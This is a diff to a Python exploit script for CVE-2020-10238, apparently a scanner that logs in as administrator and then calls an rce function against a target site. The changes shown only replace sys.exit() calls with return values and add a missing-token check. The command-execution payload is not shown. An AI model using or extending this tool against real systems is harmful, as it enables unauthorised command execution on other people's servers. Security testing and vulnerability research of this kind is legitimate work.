@@ -2,7 +2,6 @@
 # See the file 'LICENSE' for copying permission.
 # CVE-2020-10238
 
-import sys
 import requests
 import re
 from colorama import Fore, Style, init
@@ -45,7 +44,7 @@ def check_admin(sess, profile_url):
     token = extract_token(resp)
     if not token:
         print(f"{Fore.RED}{Style.BRIGHT}You are not administrator!{Style.RESET_ALL}")
-        sys.exit()
+        return None
     return token
 
 def rce(sess, profile_url, cmd, token):
@@ -75,9 +74,12 @@ def scan_cve_2020_10238(target):
     print(f'{Fore.CYAN}{Style.BRIGHT}Target: {target}{Style.RESET_ALL}')
     
     if not try_admin_login(sess, target, uname, upass):
-        sys.exit()
+        return False  # Added return here
 
     token = check_admin(sess, target)
+    if not token:  # Check if token is None
+        return False
 
     rce(sess, target, cmd, token)
+
 
